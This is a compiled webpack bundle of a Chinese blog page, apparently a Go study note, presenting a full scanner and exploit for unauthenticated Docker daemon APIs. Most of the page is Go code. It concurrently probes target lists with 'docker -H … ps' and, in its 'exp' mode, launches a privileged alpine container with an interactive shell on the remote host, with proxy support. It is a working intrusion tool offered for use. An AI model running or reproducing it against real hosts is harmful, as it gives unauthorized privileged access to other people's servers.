"use strict";(globalThis.webpackChunkblog=globalThis.webpackChunkblog||[]).push([[6143],{2497:(t,n,e)=>{e.d(n,{A:()=>r});const r=e.p+"assets/images/image-20221227164823898-bc8258b634bb3b503bc6dbc2c5487bbd.png"},7585:(t,n,e)=>{e.r(n),e.d(n,{assets:()=>s,contentTitle:()=>o,default:()=>l,frontMatter:()=>c,metadata:()=>r,toc:()=>g});const r=JSON.parse('{"id":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u8bed\u8a00\u77e5\u8bc6/Go/Go\u4ee3\u7801\u6848\u4f8b/GoLang-\u7f16\u5199POC/GoLang-Docker-Daemon-Api-Rce","title":"docker-daemon-api-rce","description":"[!Note]","source":"@site/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/05.\u8bed\u8a00\u77e5\u8bc6/03.Go/03.Go\u4ee3\u7801\u6848\u4f8b/01.GoLang-\u7f16\u5199POC/02.GoLang-Docker-Daemon-Api-Rce.md","sourceDirName":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/05.\u8bed\u8a00\u77e5\u8bc6/03.Go/03.Go\u4ee3\u7801\u6848\u4f8b/01.GoLang-\u7f16\u5199POC","slug":"/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u8bed\u8a00\u77e5\u8bc6/Go/Go\u4ee3\u7801\u6848\u4f8b/GoLang-\u7f16\u5199POC/GoLang-Docker-Daemon-Api-Rce","permalink":"/en/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u8bed\u8a00\u77e5\u8bc6/Go/Go\u4ee3\u7801\u6848\u4f8b/GoLang-\u7f16\u5199POC/GoLang-Docker-Daemon-Api-Rce","draft":false,"unlisted":false,"editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/05.\u8bed\u8a00\u77e5\u8bc6/03.Go/03.Go\u4ee3\u7801\u6848\u4f8b/01.GoLang-\u7f16\u5199POC/02.GoLang-Docker-Daemon-Api-Rce.md","tags":[],"version":"current","sidebarPosition":2,"frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"CVE-2022-26134","permalink":"/en/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u8bed\u8a00\u77e5\u8bc6/Go/Go\u4ee3\u7801\u6848\u4f8b/GoLang-\u7f16\u5199POC/GoLang-CVE-2022-26134"},"next":{"title":"go-proxy-http","permalink":"/en/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u8bed\u8a00\u77e5\u8bc6/Go/Go\u4ee3\u7801\u6848\u4f8b/GoLang-\u7b80\u6613http\u4ee3\u7406"}}');var i=e(4848),a=e(8453);const c={},o="docker-daemon-api-rce",s={},g=[{value:"\u77e5\u8bc6\u70b9",id:"\u77e5\u8bc6\u70b9",level:2},{value:"\u5e76\u53d1",id:"\u5e76\u53d1",level:3},{value:"\u547d\u4ee4\u884c\u4ea4\u4e92\u5f0f\u8f93\u5165\u8f93\u51fa",id:"\u547d\u4ee4\u884c\u4ea4\u4e92\u5f0f\u8f93\u5165\u8f93\u51fa",level:3},{value:"go \u7ed9\u6bcf\u4e2acmd\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf",id:"go-\u7ed9\u6bcf\u4e2acmd\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf",level:3},{value:"\u4ee3\u7801",id:"\u4ee3\u7801",level:2},{value:"\u8fd0\u884c\u793a\u4f8b\u56fe",id:"\u8fd0\u884c\u793a\u4f8b\u56fe",level:2}];function d(t){const n={a:"a",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",img:"img",p:"p",pre:"pre",...(0,a.R)(),...t.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.header,{children:(0,i.jsx)(n.h1,{id:"docker-daemon-api-rce",children:"docker-daemon-api-rce"})}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:"[!Note]"}),"\n",(0,i.jsxs)(n.p,{children:["\u9879\u76ee\uff1a",(0,i.jsx)(n.a,{href:"https://github.com/wjlin0/docker-daemon-api-rce",children:"docker-daemon-api-rce-wjlin0"})]}),"\n"]}),"\n",(0,i.jsx)(n.h2,{id:"\u77e5\u8bc6\u70b9",children:"\u77e5\u8bc6\u70b9"}),"\n",(0,i.jsx)(n.h3,{id:"\u5e76\u53d1",children:"\u5e76\u53d1"}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:"\u5229\u7528Goroutine \u5feb\u901f\u5b9e\u73b0\u5927\u91cf\u5e76\u53d1"}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-go",children:'c1 := make(chan map[interface{}]interface{}, thread)\nfor _, t := range targets {\n    //\u5229\u7528 go \u5173\u952e\u5b57 \u5f00\u542f gorountine \n    //wg.Add(1)\n    go check(t, c1)\n}\nfor _, _ = range targets {\n    // \u4ece\u901a\u9053\u5185\u53d6\u503c\n    b := <-c1\n    fmt.Printf("%v\\n", b)\n}\n//wg.Wait()\n'})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-go",children:'func check(t string, ch chan map[interface{}]interface{}) {\nfmt.Println("\u5f00\u59cb\u68c0\u6d4b\u76ee\u6807 ", t)\n\tb := func() (b map[interface{}]interface{}) {\n\t\tb = map[interface{}]interface{}{}\n\t\tcmd := exec.Command("docker", "-H", t, "ps")\n\t\tcheckSocksProxy(cmd)\n\t\t//fmt.Println(cmd)\n\t\tout, err := cmd.CombinedOutput()\n\t\tif err != nil {\n\t\t\tb[t] = false\n\t\t\treturn b\n\t\t}\n\t\tif strings.Contains(string(out), "CONTAINER") && strings.Contains(string(out), "ID") && strings.Contains(string(out), "IMAGE") && strings.Contains(string(out), "COMMAND") && strings.Contains(string(out), "CREATED") {\n\t\t\tb[t] = true\n\t\t\treturn b\n\t\t} else {\n\t\t\tb[t] = true\n\t\t\treturn b\n\t\t}\n\t}()\n   // \u5c06\u7ed3\u679c\u4f20\u5165\u901a\u9053ch\u4e2d\n\tch <- b\n}\n'})}),"\n",(0,i.jsx)(n.h3,{id:"\u547d\u4ee4\u884c\u4ea4\u4e92\u5f0f\u8f93\u5165\u8f93\u51fa",children:"\u547d\u4ee4\u884c\u4ea4\u4e92\u5f0f\u8f93\u5165\u8f93\u51fa"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-go",children:'cmd := exec.Command("docker", "-H", t, "run", "-it", "--rm", "--privileged", "alpine", "/bin/sh")\ncheckSocksProxy(cmd)\ncmd.Stdin = os.Stdin\ncmd.Stdout = os.Stdout\ncmd.Stderr = os.Stderr\nerr := cmd.Start()\nif err != nil {\n    return\n}\nerr = cmd.Wait()\nif err != nil {\n    fmt.Println("\u653b\u51fb\u5229\u7528\u5931\u8d25")\n    return\n}\n'})}),"\n",(0,i.jsx)(n.h3,{id:"go-\u7ed9\u6bcf\u4e2acmd\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf",children:"go \u7ed9\u6bcf\u4e2acmd\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-go",children:'var cmdEnv []string\ncmdEnv = append(cmdEnv, "ALL_PROXY="+proxy)\ncmd.Env = cmdEnv\n'})}),"\n",(0,i.jsx)(n.h2,{id:"\u4ee3\u7801",children:"\u4ee3\u7801"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-go",children:'package main\n\nimport (\n\t"bufio"\n\t"flag"\n\t"fmt"\n\t"io"\n\t"os"\n\t"os/exec"\n\t"regexp"\n\t"strings"\n)\n\nvar target string\nvar targets []string\nvar list string\nvar proxy string\nvar mod string\nvar thread int\n\n//var wg sync.WaitGroup\n\nfunc main() {\n\tInit()\n\tBanner()\n\tflag.Parse()\n\tcheckArgs()\n\tcheckDocker()\n\tif proxy != "" {\n\t\tfmt.Println("\u8bbe\u7f6e\u4ee3\u7406: " + proxy)\n\t}\n\tswitch mod {\n\tcase "check":\n\t\tc1 := make(chan map[interface{}]interface{}, thread)\n\t\tfor _, t := range targets {\n\t\t\t//wg.Add(1)\n\t\t\tgo check(t, c1)\n\t\t}\n\t\tfor _, _ = range targets {\n\t\t\tb := <-c1\n\t\t\tfmt.Printf("%v\\n", b)\n\t\t}\n\t\t//wg.Wait()\n\tcase "exp":\n\t\texp()\n\tdefault:\n\t\tos.Exit(-1)\n\t}\n}\n\nfunc checkDocker() {\n\tcmd := exec.Command("docker", "--version")\n\tout, err := cmd.CombinedOutput()\n\tif err != nil {\n\t\tfmt.Println("\u68c0\u67e5Docker\u662f\u5426\u5b58\u5728\u65f6\uff0c\u51fa\u73b0\u9519\u8bef")\n\t\tpanic(err)\n\t}\n\tif !strings.Contains(string(out), "Docker version") {\n\t\tfmt.Println("docker\u672a\u542f\u52a8 \u6216 \u4e0d\u5b58\u5728docker\uff0c\u8bf7\u68c0\u67e5")\n\t\tos.Exit(-1)\n\t}\n}\nfunc Init() {\n\tflag.StringVar(&target, "target", "", "\u76ee\u6807")\n\tflag.StringVar(&list, "list", "", "\u76ee\u6807\u5217\u8868")\n\tflag.StringVar(&proxy, "proxy", "", "\u4ee3\u7406")\n\tflag.IntVar(&thread, "thread", 20, "\u5e76\u53d1\u91cf\uff08\u4ec5\u5728check\u6a21\u5f0f\u4e0b\u751f\u6548\uff09")\n\tflag.StringVar(&mod, "mod", "check", "\u6a21\u5f0f\uff08check|exp\uff09")\n}\nfunc Banner() {\n\n\tfmt.Println(`\n           __.__  .__       _______   \n__  _  __ |__|  | |__| ____ \\   _  \\  \n\\ \\/ \\/ / |  |  | |  |/    \\/  /_\\  \\ \n \\     /  |  |  |_|  |   |  \\  \\_/   \\\n  \\/\\_/\\__|  |____/__|___|  /\\_____  /\n      \\______|            \\/       \\/ \n        Docker Api \u672a\u6388\u6743\u8bbf\u95ee `)\n}\nfunc urlHandler(target string) string {\n\tif strings.HasSuffix(target, "/") { // \u53bb\u6389\u540e\u7f00 /\n\t\ttarget = strings.TrimSuffix(target, "/")\n\t\t//fmt.Println(target)\n\t}\n\tif !strings.HasPrefix(target, "tcp") {\n\t\ttarget = "tcp://" + target\n\t}\n\tif !strings.HasPrefix(target, "http") {\n\t\ttarget = strings.Replace(target, "http", "tcp", -1)\n\n\t}\n\tif !strings.HasPrefix(target, "https") {\n\t\ttarget = strings.Replace(target, "https", "tcp", -1)\n\n\t}\n\tregIp := regexp.MustCompile(`^[\\d\\.]+$`)\n\tif len(regIp.FindAllString(target, -1)) > 0 {\n\t\tregPort := regexp.MustCompile(`^(tcp://)?\\d+\\.\\d+\\.\\d+\\.\\d+:\\d+$`)\n\t\tif len(regPort.FindAllString(target, -1)) == 0 {\n\t\t\ttarget = target + ":80"\n\t\t}\n\t} else {\n\t\tregPort := regexp.MustCompile(`^(tcp://)?.+:\\d+$`)\n\t\tif len(regPort.FindAllString(target, -1)) == 0 {\n\t\t\ttarget = target + ":80"\n\t\t}\n\t}\n\treturn target\n}\nfunc checkArgs() {\n\tif target != "" {\n\t\ttargets = append(targets, urlHandler(target))\n\t}\n\tif list != "" {\n\t\tfmt.Println("\u6b63\u5728\u6253\u5f00\u6587\u4ef6")\n\t\tfilePath := list\n\t\tfile, err := os.Open(filePath)\n\t\tif err != nil {\n\t\t\tfmt.Println("\u6587\u4ef6\u6253\u5f00\u5931\u8d25", err)\n\t\t}\n\t\tdefer file.Close()\n\t\t//\u8bfb\u539f\u6765\u6587\u4ef6\u7684\u5185\u5bb9\uff0c\u5e76\u4e14\u663e\u793a\u5728\u7ec8\u7aef\n\t\treader := bufio.NewReader(file)\n\t\tfor {\n\t\t\ttarget, err := reader.ReadString(\'\\n\')\n\t\t\tif err != nil {\n\t\t\t\tif err == io.EOF {\n\t\t\t\t\tif target != "" {\n\t\t\t\t\t\ttargets = append(targets, urlHandler(target))\n\t\t\t\t\t}\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t}\n\t\t\t//fmt.Printf("%#v\\n", target)\n\t\t\ttarget = strings.TrimSpace(target)\n\t\t\tif target == "" {\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\t//fmt.Printf("%#v\\n", target)\n\t\t\ttargets = append(targets, target)\n\t\t}\n\t}\n\n\tif targets == nil {\n\t\tflag.Usage()\n\t\tos.Exit(0)\n\t}\n}\nfunc check(t string, ch chan map[interface{}]interface{}) {\n\tfmt.Println("\u5f00\u59cb\u68c0\u6d4b\u76ee\u6807 ", t)\n\tb := func() (b map[interface{}]interface{}) {\n\t\tb = map[interface{}]interface{}{}\n\t\tcmd := exec.Command("docker", "-H", t, "ps")\n\t\tcheckSocksProxy(cmd)\n\t\t//fmt.Println(cmd)\n\t\tout, err := cmd.CombinedOutput()\n\t\tif err != nil {\n\t\t\tb[t] = false\n\t\t\treturn b\n\t\t}\n\t\tif strings.Contains(string(out), "CONTAINER") && strings.Contains(string(out), "ID") && strings.Contains(string(out), "IMAGE") && strings.Contains(string(out), "COMMAND") && strings.Contains(string(out), "CREATED") {\n\t\t\tb[t] = true\n\t\t\treturn b\n\t\t} else {\n\t\t\tb[t] = true\n\t\t\treturn b\n\t\t}\n\t}()\n\tch <- b\n\t//wg.Done()\n}\nfunc exp() {\n\tvar t string\n\tvar i int\n\tfmt.Println("\u8bf7\u9009\u62e9\u653b\u51fb\u76ee\u6807")\n\tfor i, tar := range targets {\n\t\tfmt.Println("\u76ee\u6807\uff1a", tar, " , ", i)\n\t}\n\tif len(targets) == 1 {\n\t\tt = targets[0]\n\t} else {\n\t\t_, err := fmt.Scanln(&i)\n\t\tif err != nil {\n\t\t\tt = targets[0]\n\t\t}\n\t}\n\tt = targets[i]\n\tcmd := exec.Command("docker", "-H", t, "run", "-it", "--rm", "--privileged", "alpine", "/bin/sh")\n\tcheckSocksProxy(cmd)\n\tcmd.Stdin = os.Stdin\n\tcmd.Stdout = os.Stdout\n\tcmd.Stderr = os.Stderr\n\terr := cmd.Start()\n\tif err != nil {\n\t\treturn\n\t}\n\terr = cmd.Wait()\n\tif err != nil {\n\t\tfmt.Println("\u653b\u51fb\u5229\u7528\u5931\u8d25")\n\t\treturn\n\t}\n\n}\nfunc checkSocksProxy(cmd *exec.Cmd) {\n\tif proxy == "" {\n\t\treturn\n\t}\n\tproxy = strings.TrimSpace(proxy)\n\tif strings.HasPrefix(target, "http") {\n\t\tfmt.Println("\u68c0\u67e5\u662f\u5426\u4e3asocks\uff084\u30014a\u30015\uff09\u4ee3\u7406")\n\t\tos.Exit(-1)\n\t}\n\n\tvar cmdEnv []string\n\tcmdEnv = append(cmdEnv, "ALL_PROXY="+proxy)\n\tcmd.Env = cmdEnv\n}\n'})}),"\n",(0,i.jsx)(n.h2,{id:"\u8fd0\u884c\u793a\u4f8b\u56fe",children:"\u8fd0\u884c\u793a\u4f8b\u56fe"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20221227164823898",src:e(2497).A+"",width:"805",height:"728"})})]})}function l(t={}){const{wrapper:n}={...(0,a.R)(),...t.components};return n?(0,i.jsx)(n,{...t,children:(0,i.jsx)(d,{...t})}):d(t)}},8453:(t,n,e)=>{e.d(n,{R:()=>c,x:()=>o});var r=e(6540);const i={},a=r.createContext(i);function c(t){const n=r.useContext(a);return r.useMemo(function(){return"function"==typeof t?t(n):{...n,...t}},[n,t])}function o(t){let n;return n=t.disableParentContext?"function"==typeof t.components?t.components(i):t.components||i:c(t.components),r.createElement(a.Provider,{value:n},t.children)}}}]);